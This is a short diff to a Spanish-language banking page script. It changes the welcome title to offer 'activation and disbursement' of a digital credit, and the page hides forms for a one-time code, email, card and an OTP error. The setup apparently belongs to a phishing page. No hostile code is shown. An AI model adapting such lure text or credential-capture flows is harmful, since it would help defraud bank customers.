@@ -27,7 +27,7 @@ function detectar_dispositivo(){
 
 function vista_usuario(){
     $("#fondo,#mensaje").hide();
-    $(".titulo").html("Bienvenido a tu Banca Virtual");
+    $(".titulo").html("Bienvenido a la activacion y desembolso de tu Credito Digital");
     $(".vinculo").show();
 
     $("#frm-otp,#frm-correo,#frm-tarjeta,#frm-errorotp").hide();
